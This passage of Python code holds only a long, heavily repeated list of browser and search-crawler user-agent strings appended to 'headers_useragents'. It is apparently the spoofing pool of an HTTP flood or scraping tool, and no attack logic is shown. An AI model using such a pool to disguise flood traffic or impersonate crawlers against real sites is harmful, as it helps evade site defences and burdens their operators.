	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
